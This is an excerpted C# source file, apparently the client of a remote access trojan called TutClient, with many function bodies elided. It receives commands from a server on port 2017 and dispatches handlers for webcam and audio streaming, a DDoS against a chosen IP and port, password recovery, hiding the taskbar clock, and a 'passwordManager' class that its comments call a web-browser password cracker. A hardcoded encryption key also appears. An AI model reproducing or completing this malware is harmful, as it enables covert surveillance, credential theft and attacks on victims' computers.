...
namespace TutClient
{
    ...
    class Program
    {
        ...
        private const int _PORT = 2017; // same as server port ------------------------port
        ...
        private static void ReceiveResponse()
        {
            ...
            try
            {
                ...
                if (!isFileDownload)
                {
                    ...
                    if (text == "fpslow")    /////--------------------------------------------------FPS  FPS FPS
                    {
                        fps = 150;
                        Console.WriteLine("FPS now 150");
                    }
                    if (text == "fpsbest")    /////--------------------------------------------------FPS  FPS FPS
                    {
                        fps = 80;
                        Console.WriteLine("FPS now 80");
                    }
                    if (text == "fpshigh")    /////--------------------------------------------------FPS  FPS FPS
                    {
                        fps = 50;
                        Console.WriteLine("FPS now 50");
                    }
                    if (text == "fpsmid")    /////--------------------------------------------------FPS  FPS FPS
                    {
                        fps = 100;
                        Console.WriteLine("FPS now 100");
                    }

                    if (text.StartsWith("freq-"))  //-------------------------------------dont need this function sounds
                    {
                        int freq = int.Parse(text.Split('-')[1]);
                        generateFreq(freq, 2); //Duration in seconds
                    }

                    if (text.StartsWith("sound-")) //-------------------------------------dont need this function
                    {
                    ...
                    /* if (text.StartsWith("ts2|"))*/  //-------------------------------------dont need this function console beep
                    if (text.StartsWith("t2s|")) //this was wrong way it was ts2
                    {
                        string txt = text.Split('|')[1];
                        t2s(txt);
                    }

                    if (text.StartsWith("cd|"))    //-------------------------------------dont need this function
                    {
                    ...
                    if (text.StartsWith("emt|"))          //-------------------------------------dont need this function
                    {
                    ...
                    if (text == "alist")        //-------------------------------------dont need this function  audio
                    {
                    ...
                    if (text == "astop")
                    {
                        ...
                        streaming.Dispose();
                        streaming = null;
                    }  //-------------------------------------dont need this function WEB CAM
                    if (text == "wlist")
                    {
                    ...
                    if (text.StartsWith("ddosr"))   //-------------------------------------dont need this function DDOS
                    {
                        string[] p = text.Split('|');
                        string ip = p[1];
                        string port = p[2];
                    ...
                    if (text == "getpw")   //-------------------------------------dont need this function password recovery
                    {
        ...
        private static void sendAudio(object sender, NAudio.Wave.WaveInEventArgs e)  //-------------------------------------dont need this function AUDIO
        {
        ...
        public static void hClock()   //-------------------------------------dont need this function hide clock
        {
            int hwnd = 0;
            ShowWindow(
        ...
        public static void sClock()  //-------------------------------------dont need this function see clock
        {
            int hwnd = 0;
            ShowWindow(
              FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
        ...
        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99213"; //MAKV2SPBNI99212
        ...
        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99213"; //this is the secret encryption key  you want to hide dont show it to other guys //MAKV2SPBNI99212
    ...
    public class passwordManager    //-------------------------------------dont need this function PASSWORD CRACKER FOR WEB BROWSERS
    {
